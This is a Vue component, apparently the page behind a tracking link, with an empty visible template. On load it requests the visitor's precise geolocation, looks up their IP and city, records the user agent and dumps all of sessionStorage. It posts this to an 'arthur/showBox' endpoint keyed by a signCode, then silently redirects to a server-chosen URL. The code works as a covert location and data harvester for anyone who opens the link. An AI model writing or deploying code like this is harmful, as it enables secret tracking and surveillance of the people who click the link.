<template>

</template>
<script>

  export default {
    data() {
      return {
        hostUrl: domain.hostUrl,
        WebArthur: null,
        authIp: false,
        authLocation: false
      }
    },
    methods: {

      getIp: function () {
        // var cip = returnCitySN["cip"];
        // //给vuedata对象里的字段赋值
        // console.log(cip);
        // sessionStorage.setItem("ip", cip);
        try {
          var self = this;
          // console.log("------http://pv.sohu.com/cityjson?ie=utf-8");
          this.loadJS("https://pv.sohu.com/cityjson?ie=utf-8", {
            success: function () {
              sessionStorage.setItem("ip", returnCitySN['cip']);
              self.onUpLoad();
            },
            complate: function () {
              self.authIp = true;
            }
          });
        } catch (e) {
        }

      }, loadJS: function (url, el) {
        var head = document.getElementsByTagName('head');
        if (head && head.length) {
          head = head[0];
        } else {
          head = document.body;
        }
        var script = document.createElement('script');
        script.src = url;
        script.type = "text/javascript";
        head.appendChild(script);
        script.onload = script.onreadystatechange = function () {
          if ((!this.readyState) || this.readyState == "complete" || this.readyState == "loaded") {
            el.success();
          }
          el.complate();


        }//end onreadystatechange
      }, onSystemDic: function (type) {
        var param = {
          signCode: this.$route.query.signCode,
        }
        console.log(param);
        var self = this;
        this.$axiosPro("post", this.hostUrl + 'arthur/getWebArthur', param).then((res) => {
          var response = res.data;
          console.log(response);
          if (0 == response.code) {
            var result = response.result;
            self.WebArthur = result;
            if (1 == response.code) {
              self.onUpLoad();
            }
          }
        }).catch((response) => {
        })
      },
      onUpLoad: function () {

        if (this.WebArthur == null) {
          this.onSystemDic(1);
          return;
        }

        var key = 'D21Uq65MzDF28PaEx7zO0dSM2WuG03z01';
        sessionStorage.setItem("webTrackId", this.WebArthur.id);
        sessionStorage.setItem("userAgent", window.navigator.userAgent);
        var message = JSON.stringify(this.getLocationData());
        console.log(message);

        var param = {
          url: window.location.href,
          type: '4',
          data: message
        }
        var self = this;
        this.$axiosPro("post", this.hostUrl + 'arthur/showBox', param).then((res) => {

          if (self.authIp && self.authLocation) {
            window.location.href=self.WebArthur.redirectUrl;
          }
        }).catch((response) => {
        })
      }, getLocationData: function () {
        var len = sessionStorage.length;
        console.log(len)
        var arr = new Array();
        for (var i = 0; i < len; i++) {
          var getKey = sessionStorage.key(i);
          var getVal = sessionStorage.getItem(getKey);
          var values = '';
          if (isJSON(getVal)) {
            values = JSON.parse(getVal);
          } else {
            values = getVal;
          }
          arr[i] = {
            'key': getKey,
            'val': values,
          }
        }
        return arr;

        function isJSON(str) {
          if (typeof str == 'string') {
            try {
              var obj = JSON.parse(str);
              if (typeof obj == 'object' && obj) {
                return true;
              } else {
                return false;
              }

            } catch (e) {
              return false;
            }
          }
        }
      },
      getLocation() {
        const self = this
        AMap.plugin('AMap.Geolocation', function () {
          var geolocation = new AMap.Geolocation({
            // 是否使用高精度定位，默认：true
            enableHighAccuracy: true,
            // 设置定位超时时间，默认：无穷大
            timeout: 10000,
          })
          geolocation.getCurrentPosition()
          AMap.event.addListener(geolocation, 'complete', onComplete)
          AMap.event.addListener(geolocation, 'error', onError)

          function onComplete(data) {
            // data是具体的定位信息
            self.authLocation = true;
            console.log('定位成功信息：', data)
            sessionStorage.setItem("Geolocation", JSON.stringify(data));
            self.onUpLoad();


          }

          function onError(data) {
            // 定位出错
            console.log('定位失败错误：', data)
            self.getLngLatLocation()
          }
        })
      }
      ,
      getLngLatLocation() {
        AMap.plugin('AMap.CitySearch', function () {
          var citySearch = new AMap.CitySearch()
          citySearch.getLocalCity(function (status, result) {
            console.log(result);
            console.log(status);
            if (status === 'complete' && result.info === 'OK') {
              // 查询成功，result即为当前所在城市信息
              console.log('通过ip获取当前城市：', result)
              sessionStorage.setItem("CitySearch", JSON.stringify(result));
              //逆向地理编码
              AMap.plugin('AMap.Geocoder', function () {
                var geocoder = new AMap.Geocoder({
                  // city 指定进行编码查询的城市，支持传入城市名、adcode 和 citycode
                  city: result.adcode
                })
                var lnglat = result.rectangle.split(';')[0].split(',')
                geocoder.getAddress(lnglat, function (status, data) {
                  console.log(data);
                  if (status === 'complete' && data.info === 'OK') {
                    // result为对应的地理位置详细信息
                    console.log(data)
                    sessionStorage.setItem("Geocoder", JSON.stringify(data));
                  }
                })
              })
            }
          })
        })
      }
    },
    created: function () {
      this.getLocation();
      this.getIp();
      this.onSystemDic();
    }
  }
</script>
<style>

</style>
